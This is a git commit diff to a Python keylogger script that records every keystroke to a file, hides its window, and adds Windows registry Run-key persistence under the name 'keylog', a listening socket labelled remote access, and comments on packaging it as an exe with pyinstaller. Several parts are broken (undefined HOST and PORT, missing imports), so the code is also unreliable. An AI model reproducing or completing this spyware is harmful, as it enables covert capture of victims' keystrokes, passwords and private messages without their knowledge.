6b8b61e50208122283be31bf5eace11f353a2afa
Vatafu Vladut <vladvatafu9@gmail.com>
2017-11-12 09:17:25 -0800

    Update Main.py

--- Main.py
+++ Main.py
@@ -1,13 +1,15 @@
 from pynput.keyboard import Key, Listener
+import os
 import smtplib
 import socket
-import crypto
+import winreg
+import sys
 
-f = open("log.txt",'w')
+f = open(r'C:\Users\Vlad\Desktop\OPArianG0ne\\log.txt','w')
 
 def on_press(key):
     f.write('{0}'.format(
-        key,'\n'))
+        key,'\n'))  
 
 def on_release(key):
     f.write('{0}'.format(
@@ -29,9 +31,27 @@ def hide():
     win32gui.ShowWindow(window,0)
     return True
 
-def encrypt_my_drive(folder):
-    
+def depend_me():   
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Run',0,winreg.KEY_ALL_ACCESS)
+    winreg.SetValueEx(key,'keylog',0,winreg.REG_SZ,"C:\Program Files (x86)\Python36-32\Scripts\dist\\1.exe") 
+
+def rem0te_access(address,port):
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.bind((HOST,PORT))
+    s.listen(1)
+    conn, addr = s.accept()
+    data = conn.recv(3072)
+    if 'hi' in data:
+        conn.sendall('hello from m0le!')
+
 
 def main():
+    depend_me()
     hide()
     collect()
+
+main()
+
+#to make an exe pyinstaller.exe --onefile "C:\Users\Vlad\Desktop\OPArianG0ne\1.py"
+#pyinstall for u vlad is in prog files x86 python 36 scripts
+#needs to be installed pyinstaller to be converted to an exe
